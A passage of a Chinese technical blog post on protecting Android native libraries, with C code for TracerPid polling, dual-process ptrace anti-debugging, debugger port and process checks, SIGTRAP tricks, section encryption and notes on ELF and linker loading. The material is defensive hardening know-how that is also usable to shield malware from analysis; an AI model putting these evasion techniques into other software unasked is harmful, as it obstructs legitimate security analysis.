pid=getpid();</span><br><span class="line">    LOGI(<span class="string">"pid is : %d "</span>,pid);</span><br><span class="line">    <span class="built_in">sprintf</span>(pidname,<span class="string">"/proc/%d/status"</span>,pid);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        fd = fopen(pidname, <span class="string">"r"</span>);</span><br><span class="line">        <span class="keyword">while</span> (fgets(context, <span class="number">128</span>, fd)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strncmp</span>(context, <span class="string">"TracerPid"</span>, <span class="number">9</span>)==<span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> status = atoi(&amp;context[<span class="number">10</span>]);</span><br><span class="line">                LOGI(<span class="string">"the process status is %d, %s"</span>, status, context);</span><br><span class="line">                fclose(fd);</span><br><span class="line">                syscall(__NR_close, fd);</span><br><span class="line">                <span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">                    LOGI(<span class="string">"find the process was debugging"</span>);</span><br><span class="line">                    kill(pid, SIGKILL);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>思路讲解</strong></p><p>&emsp;&emsp;通过开辟一个线程，在线程中执行检查代码，首先获取当前进程的pid，在获取该进程的status信息，遍历字段，找到TracePid字段，然后检查该值是否为0，如果不为0，即认为进程被调试，kill掉进程即可。</p><p><strong>效果</strong><br><img src="/2018/03/07/soanti/15204214066019.jpg" alt=""></p><p>运行程序，开始循环检查。</p><p><img src="/2018/03/07/soanti/15204214772786.jpg" alt="a-w400"></p><p>未被调试时，TracePid值为0.<br>我们用ida附加上去，观察效果。</p><p><img src="/2018/03/07/soanti/15204215759112.jpg" alt=""></p><p>点击运行后，发现检查到了被调试，TracePid的值时13615.</p><p><img src="/2018/03/07/soanti/15204216525218.jpg" alt=""></p><p>我们的调试进程的pid正好时13615.</p><h3 id="利用ptrace实现双进程保护"><a href="#利用ptrace实现双进程保护" class="headerlink" title="利用ptrace实现双进程保护"></a>利用ptrace实现双进程保护</h3><p>&emsp;&emsp;我们发现ida附加上去后，进程停止了，这时候并不能实现检查，那么我们需要开一个进程去检查而不是线程，所以双进程保护是一个很好的方式。我们利用fork函数来开一个子进程，在子进程中检查父进程时候被调试，而子进程由父进程调试，由于linux下，进程只允许被一个进程调试，那么我们用ida附加到子进程是不被允许的，而如果附加到父进程又会被子进程检测到，所以双进程保护可以起到更好的效果。</p><p><strong>示例代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readtrace2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fd;</span><br><span class="line">    <span class="keyword">char</span> filename[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">int</span> pid=getpid();</span><br><span class="line">    LOGI(<span class="string">"PID : %d"</span>, pid);</span><br><span class="line">    <span class="built_in">sprintf</span>(filename, <span class="string">"/proc/%d/status"</span>, pid);</span><br><span class="line">    <span class="keyword">pid_t</span> child=fork();</span><br><span class="line">    <span class="keyword">if</span> (child==<span class="number">0</span>) &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">long</span> pt = ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//子进程反调试</span></span><br><span class="line"></span><br><span class="line">        logptrace(<span class="string">"child traceme"</span>,pt);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            fd = fopen(filename, <span class="string">"r"</span>);</span><br><span class="line">            <span class="keyword">while</span> (fgets(line, <span class="number">128</span>, fd)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strncmp</span>(line, <span class="string">"TracerPid"</span>, <span class="number">9</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">int</span> status = atoi(&amp;line[<span class="number">10</span>]);</span><br><span class="line">                    LOGI(<span class="string">"the process status is %d, %s"</span>, status, line);</span><br><span class="line">                    fclose(fd);</span><br><span class="line">                    syscall(__NR_close, fd);</span><br><span class="line">                    <span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">                        LOGI(<span class="string">"find the process was debugging"</span>);</span><br><span class="line">                        kill(pid, SIGKILL);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sleep(<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(child&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        LOGE(<span class="string">"fork error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>思路讲解</strong></p><p>&emsp;&emsp;父进程fork后，在子进程中完成和之前通用的操作，而在父进程中，要完成对子进程的附加操作。我使用了ptrace，关于ptrace，可以看一下我之前遇到问题时找到的一篇文章，我把它翻译了——<a href="http://fancy-blogs.com/2018/03/06/ptrace/">链接</a>。<br>&emsp;&emsp;父进程<code>wait(NULL);</code>是为了获取子进程SIGTRAP信号，子进程<code>wait(NULL);</code>是为了通知父进程。因为执行PTRACE操作时，目标进程必须是停止状态。在子进程里PTRACE_TRACEME操作，在之前找到的别人的代码中只要子进程执行PTRACE_TRACEME就会被父进程跟踪，而我实验发现并不可行，必须要有这两个wait来满足被跟踪进程停止的条件。</p><p><strong>效果</strong></p><p>运行程序：<br><img src="/2018/03/07/soanti/15204258649788.jpg" alt=""></p><p>子进程的PTRACE_TRACE执行成功，子进程开始检查。</p><p><img src="/2018/03/07/soanti/15204259002831.jpg" alt=""></p><p>子进程的TracePid不为0，子进程已经被跟踪。</p><p><img src="/2018/03/07/soanti/15204261827579.jpg" alt=""></p><p>9998是父进程的一个线程。</p><p>这时候我们尝试用ida附加，先附加父进程。</p><p><img src="/2018/03/07/soanti/15204262776372.jpg" alt=""></p><p>子进程检查到调试进程，这次不用ida使其运行起来，父进程直接被子进程kill掉了。</p><p>我们尝试附加子进程。</p><p><img src="/2018/03/07/soanti/15204263248541.jpg" alt=""></p><p>发现根本无法附加上去。</p><p><a href="https://github.com/Minxin/checktrace" target="_blank" rel="noopener">完整代码</a></p><h3 id="执行时间校验"><a href="#执行时间校验" class="headerlink" title="执行时间校验"></a>执行时间校验</h3><p>通过计算某部分代码的执行时间差来判断是否被调试，在Linux内核下可以通过time、gettimeofday，或者直接通过sys call来获取当前时间。另外，还可以通过自定义SIGALRM信号来判断程序运行是否超时。</p><h3 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h3><p>在Linux下，inotify可以实现监控文件系统事件（打开、读写、删除等），加固方案可以通过inotify监控apk自身的某些文件，某些内存dump技术通过/proc/pid/maps、/proc/pid/mem来实现内存dump，所以监控对这些文件的读写也能起到一定的反调试效果。</p><h3 id="调试进程及端口检查"><a href="#调试进程及端口检查" class="headerlink" title="调试进程及端口检查"></a>调试进程及端口检查</h3><ul><li>使用IDA动态调试APK时，android_server默认监听23946端口，所以通过检测端口号可以起到一定的反调试作用。具体而言，可以通过检测/proc/net/tcp文件，或者直接system执行命令netstat -apn等。</li><li>在对APK进行动态调试时，可能会打开android_server、gdb、gdbserver等调试相关进程，一般情况下，这几个打开的进程名和文件名相同，所以可以通过运行状态下的进程名来检测这些调试相关进程。具体而言，可以通过打开/proc/pid/cmdline、/proc/pid/statue等文件来获取进程名。当然，这种检测方法非常容易绕过――直接修改android_server、gdb、gdbserver的名字即可。</li></ul><h3 id="信号机制"><a href="#信号机制" class="headerlink" title="信号机制"></a>信号机制</h3><p>调试器设置断点时会发出SIGTRAP信号，系统接受到SIGTRAP信号后，会用当前pc值处的原指令替换bp指令。当在代码中本来就存在bp指令时，就会陷入循环（bp指令替换bp指令）。通过先注册自己的signal函数处理breakpoint异常（SIGTRAP），然后在运行时调用该函数，即可触发自定义SIGTRAP的接管函数。而动态调试时，SIGTRAP会先被调试器接收，处理失败。</p><p>from other’s blog:<br>breakpoint命令会使被调试进程发出信号SIGTRAP。通常调试器会截获Linux系统内给被调试进程的各种信号，由调试者可选地传递给被调试进程。但是SIGTRAP是个例外，因为通常的目标程序中不会出现breakpoint，因为这会使得程序自己奔溃。因此，当调试器遇到SIGTRAP信号时会认为是自己下的断点发出的。这样一来当调试器给这个breakpoint命令插入断点breakpoint后，备份的命令也是breakpoint（原指令），这样当继续执行时，调试器将备份指令恢复并执行，结果误以为备份后这个位置发出的SIGTRAP又是自己下的断点造成的，这样一来就会使得调试器的处理逻辑出现错误，不同的调试器会导致各种不同的问题。</p><p>利用信号机制对抗，可以在代码中写好断点，自己实现对应的信号处理函数，在处理函数中加入代码解密等功能，使得调试中擅自去除断点指令会导致崩溃。再对处理函数加密或者混淆，使静态分析难度加大，而在动态调试中就必须跟入信号处理函数。 </p><h2 id="so加密"><a href="#so加密" class="headerlink" title="so加密"></a>so加密</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p><strong>section 加密</strong><br>自定义section，把需要加密的函数定义在该section中，该section将会被加密，在init中将其解密。<br>加密操作是通过so的信息来获取到自定义section，通过offset和size来获取到指定section，把section所有字节加密，修改section修改ELFheader中几个无用的字段来方便解密时索引。<br>解密操作，通过之前放置的索引来获取到加密的区域，对其解密后，就可以调用了。<br>尝试了修改e_shoff，由于是动态注册函数，在加载的时候报错了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">03-13 02:17:51.362 11931-11931/com.fancy.testsoshell E/linker: </span><br><span class="line">&quot;/data/app/com.fancy.testsoshell-2/lib/arm/libencrypto.so&quot; .dynamic section header was not found</span><br></pre></td></tr></table></figure><p>尝试将信息都放置e_entry中是可行的。</p><p>代码来源：<a href="http://www.wjdiankong.cn/archives/563" target="_blank" rel="noopener">http://www.wjdiankong.cn/archives/563</a><br>文章中使用静态注册+修改e_entry+e_shoff的方法，测试中出现问题，该用动态注册，加密代码稍作了修改。</p><p><a href="https://github.com/Minxin/SoSectionEncrypto" target="_blank" rel="noopener">测试实例</a></p><p><a href="http://www.wjdiankong.cn/archives/565" target="_blank" rel="noopener"><strong>函数加密</strong></a></p><h3 id="ELF格式"><a href="#ELF格式" class="headerlink" title="ELF格式"></a>ELF格式</h3><p><img src="/2018/03/07/soanti/elffront.png" alt="elffront"></p><p><strong>ELF header</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">unsigned char e_ident[EI_NIDENT];    //目标文件标识信息</span><br><span class="line">Elf32_Half e_type;                             //目标文件类型</span><br><span class="line">Elf32_Half e_machine;                       //目标体系结构类型</span><br><span class="line">Elf32_Word e_version;                      //目标文件版本</span><br><span class="line">Elf32_Addr e_entry;                          //程序入口的虚拟地址,若没有，可为0</span><br><span class="line">Elf32_Off e_phoff;                            //程序头部表格（Program Header Table）的偏移量（按字节计算）,若没有，可为0</span><br><span class="line">Elf32_Off e_shoff;                            //节区头部表格（Section Header Table）的偏移量（按字节计算）,若没有，可为0</span><br><span class="line">Elf32_Word e_flags;                        //保存与文件相关的，特定于处理器的标志。标志名称采用 EF_machine_flag的格式。</span><br><span class="line">Elf32_Half e_ehsize;                        //ELF 头部的大小（以字节计算）。</span><br><span class="line">Elf32_Half e_phentsize;                 //程序头部表格的表项大小（按字节计算）。</span><br><span class="line">Elf32_Half e_phnum;                      //程序头部表格的表项数目。可以为 0。</span><br><span class="line">Elf32_Half e_shentsize;                  //节区头部表格的表项大小（按字节计算）。</span><br><span class="line">Elf32_Half e_shnum;                      //节区头部表格的表项数目。可以为 0。</span><br><span class="line">Elf32_Half e_shstrndx;                  //节区头部表格中与节区名称字符串表相关的表项的索引。如果文件没有节区名称字符串表，此参数可以为 SHN_UNDEF。</span><br><span class="line">&#125;Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p><img src="/2018/03/07/soanti/15208398577269.png" alt=""></p><p><strong>Program segment header table</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* Program segment header. */ </span><br><span class="line">typedef struct &#123; </span><br><span class="line">Elf32_Word p_type; /* Segment type */ </span><br><span class="line">Elf32_Off p_offset; /* Segment file offset */ </span><br><span class="line">Elf32_Addr p_vaddr; /* Segment virtual address */ </span><br><span class="line">Elf32_Addr p_paddr; /* Segment physical address */ </span><br><span class="line">Elf32_Word p_filesz; /* Segment size in file */ </span><br><span class="line">Elf32_Word p_memsz; /* Segment size in memory */ </span><br><span class="line">Elf32_Word p_flags; /* Segment flags */ </span><br><span class="line">Elf32_Word p_align; /* Segment alignment */ </span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure><p><strong>Section header table</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> typedef struct&#123;</span><br><span class="line">Elf32_Word sh_name;   //节区名，是节区头部字符串表节区（Section Header String Table Section）的索引。名字是一个 NULL 结尾的字符串。</span><br><span class="line">Elf32_Word sh_type;    //为节区类型</span><br><span class="line">Elf32_Word sh_flags;    //节区标志</span><br><span class="line">Elf32_Addr sh_addr;    //如果节区将出现在进程的内存映像中，此成员给出节区的第一个字节应处的位置。否则，此字段为 0。</span><br><span class="line">Elf32_Off sh_offset;    //此成员的取值给出节区的第一个字节与文件头之间的偏移。</span><br><span class="line">Elf32_Word sh_size;   //此 成 员 给 出 节 区 的 长 度 （ 字 节 数 ）。</span><br><span class="line">Elf32_Word sh_link;   //此成员给出节区头部表索引链接。其具体的解释依赖于节区类型。</span><br><span class="line">Elf32_Word sh_info;       //此成员给出附加信息，其解释依赖于节区类型。</span><br><span class="line">Elf32_Word sh_addralign;    //某些节区带有地址对齐约束.</span><br><span class="line">Elf32_Word sh_entsize;    //某些节区中包含固定大小的项目，如符号表。对于这类节区，此成员给出每个表项的长度字节数。</span><br><span class="line">&#125;Elf32_Shdr;</span><br></pre></td></tr></table></figure><p><img src="/2018/03/07/soanti/15208638014797.png" alt=""></p><p><strong>特殊节区</strong></p><p><img src="/2018/03/07/soanti/15208647310267.png" alt=""></p><p><strong>section索引过程：</strong></p><p>0+header.e_shoff=section_header_table_startaddress</p><p><strong>section名称索引过程：</strong></p><p>0+section_header_table[header.strndx].s_offset=string_table_startaddresss</p><h3 id="从linker源码看so加载"><a href="#从linker源码看so加载" class="headerlink" title="从linker源码看so加载"></a>从linker源码看so加载</h3><p>首先会调用do_dlopen, 其中调用find_library来获取soinfo，find_library调用find_library_internal。<br>find_library_internal会调用find_loaded_library来查看程序so调用链solist中是否已存在需要加载的so，如果有直接返回soinfo，否则调用load_library来获取soinfo。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> soinfo* <span class="title">load_library</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name)</span> </span>&#123;    <span class="comment">// Open the file.</span>    <span class="keyword">int</span> fd = open_library(name);    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;        DL_ERR(<span class="string">"library \"%s\" not found"</span>, name);        <span class="keyword">return</span> <span class="literal">NULL</span>;    &#125;    <span class="comment">// Read the ELF header and load the segments.</span>    <span class="function">ElfReader <span class="title">elf_reader</span><span class="params">(name, fd)</span></span>;    <span class="keyword">if</span> (!elf_reader.Load()) &#123;        <span class="keyword">return</span> <span class="literal">NULL</span>;    &#125;    <span class="keyword">const</span> <span class="keyword">char</span>* bname = <span class="built_in">strrchr</span>(name, <span class="string">'/'</span>);    soinfo* si = soinfo_alloc(bname ? bname + <span class="number">1</span> : name);    <span class="keyword">if</span> (si == <span class="literal">NULL</span>) &#123;        <span class="keyword">return</span> <span class="literal">NULL</span>;    &#125;    si-&gt;base = elf_reader.load_start();    si-&gt;size = elf_reader.load_size();    si-&gt;load_bias = elf_reader.load_bias();    si-&gt;flags = <span class="number">0</span>;    si-&gt;entry = <span class="number">0</span>;    si-&gt;dynamic = <span class="literal">NULL</span>;    si-&gt;phnum = elf_reader.phdr_count();    si-&gt;phdr = elf_reader.loaded_phdr();    <span class="keyword">return</span> si;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ElfReader <span class="title">elf_reader</span><span class="params">(name, fd)</span></span>;</span><br><span class="line"></span><br><span class="line">ElfReader::ElfReader(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">int</span> fd)</span><br><span class="line">    : name_(name), fd_(fd),</span><br><span class="line">     phdr_num_(<span class="number">0</span>), phdr_mmap_(<span class="literal">NULL</span>), phdr_table_(<span class="literal">NULL</span>), phdr_size_(<span class="number">0</span>),</span><br><span class="line">     load_start_(<span class="literal">NULL</span>), load_size_(<span class="number">0</span>), load_bias_(<span class="number">0</span>),</span><br><span class="line">     loaded_phdr_(<span class="literal">NULL</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">elf_reader.Load()</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> ElfReader::Load() &#123;</span><br><span class="line"><span class="keyword">return</span> ReadElfHeader() &amp;&amp;</span><br><span class="line">      VerifyElfHeader() &amp;&amp;</span><br><span class="line">      ReadProgramHeader() &amp;&amp;</span><br><span class="line">      ReserveAddressSpace() &amp;&amp;</span><br><span class="line">      LoadSegments() &amp;&amp;</span><br><span class="line">      FindPhdr();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ReadElfHeader():获取header<br>VerifyElfHeader():校验<br>magic<br>header_.e_ident[EI<em>CLASS]<br>header</em>.e_ident[EI<em>DATA]<br>header</em>.e<em>type<br>header</em>.e<em>version<br>header</em>.e_machine<br>ReadProgramHeader():读取Program segment header table<br>ReserveAddressSpace():根据program header 计算 SO 需要的内存大小并分配相应的空间<br>LoadSegments():遍历 program header table，找到类型为 PT_LOAD 的 segment，使用 mmap 将 segment 映射到内存<br>FindPhdr():获取内存中被加载的段地址</p><p><code>soinfo* si = soinfo_alloc(bname ? bname + 1 : name);</code><br>为so分配一个soinfo，并添加到solist中</p><p><strong>链接：</strong></p><p>a.定位动态节；<br>b.解析动态节；<br>c.加载依赖so；<br>d.重定位：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phdr_table_get_dynamic_section(phdr, phnum, base, &amp;si-&gt;dynamic,</span><br><span class="line">                                  &amp;dynamic_count, &amp;dynamic_flags);</span><br></pre></td></tr></table></figure><p>获取.dynamic section 在内存中的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(void) phdr_table_get_arm_exidx(phdr, phnum, base,</span><br><span class="line">                                   &amp;si-&gt;ARM_exidx, &amp;si-&gt;ARM_exidx_count);</span><br></pre></td></tr></table></figure><p>获取arm_exidx section 在内存中的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uint32_t needed_count = 0;  </span><br><span class="line">   for (Elf32_Dyn* d = si-&gt;dynamic; d-&gt;d_tag != DT_NULL; ++d) &#123;  </span><br><span class="line">       DEBUG(&quot;d = %p, d[0](tag) = 0x%08x d[1](val) = 0x%08x&quot;, d, d-&gt;d_tag, d-&gt;d_un.d_val);  </span><br><span class="line">       switch(d-&gt;d_tag)&#123;  </span><br><span class="line">       case DT_HASH:  </span><br><span class="line">           si-&gt;nbucket = ((unsigned *) (base + d-&gt;d_un.d_ptr))[0];  </span><br><span class="line">           si-&gt;nchain = ((unsigned *) (base + d-&gt;d_un.d_ptr))[1];  </span><br><span class="line">           ...</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">Elf32_Wordd_tag;/* entry tag value */</span><br><span class="line">union &#123;</span><br><span class="line">Elf32_Addrd_ptr;</span><br><span class="line">Elf32_Wordd_val;</span><br><span class="line">&#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><p>由.dynamic section 各自的tag确定该节用途<br>d_tag = DT_SYMTAB表示该项存储的是符号表的信息<br>d_un.d_ptr 表示符号表的虚拟地址的偏移<br>d_tag = DT_RELSZ d_un.d_val 表示重定位表rel的项数</p><p>解析的过程就是遍历数组中的每一项，根据d_tag的不同，获取到不同的信息.</p><p>不同tag类型的节使用d_ptr和d_val之一，表达意义也是不一致的。</p><p>参考文章：<a href="http://blog.csdn.net/feibabeibei_beibei/article/details/53004525" target="_blank" rel="noopener">http://blog.csdn.net/feibabeibei_beibei/article/details/53004525</a></p><p><a href="http://blog.csdn.net/feibabeibei_beibei/article/details/52986326" target="_blank" rel="noopener">http://blog.csdn.net/feibabeibei_beibei/article/details/52986326</a><br><img src="/2018/03/07/soanti/15209025437413.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;so保护总结&quot;&gt;&lt;a href=&quot;#so保护总结&quot; class=&quot;headerlink&quot; title=&quot;so保护总结&quot;&gt;&lt;/a&gt;so保护总结&lt;/h1&gt;&lt;h2 id=
      
    
    </summary>
    
    
  </entry>
  
</feed>
